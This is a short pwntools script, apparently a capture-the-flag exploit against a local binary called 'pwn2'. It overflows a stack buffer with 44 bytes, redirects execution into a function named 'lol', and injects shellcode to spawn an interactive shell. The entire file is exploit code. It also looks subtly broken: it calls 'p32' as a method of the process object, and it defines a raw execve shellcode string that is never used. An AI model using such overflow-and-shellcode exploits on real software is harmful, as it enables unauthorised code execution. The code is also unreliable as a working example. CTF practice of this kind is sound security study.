from pwn import *

p = process("./pwn2")
e = ELF("./pwn2")
shellcode: bytes = b"1\xc9\xf7\xe1\xb0\x0bQh//shh/bin\x89\xe3\xcd\x80"

p.send(b"A" * 44)
p.p32(e.functions["lol"].address + 3)
p.send(asm(shellcraft.sh()))
p.sendline()

p.interactive()
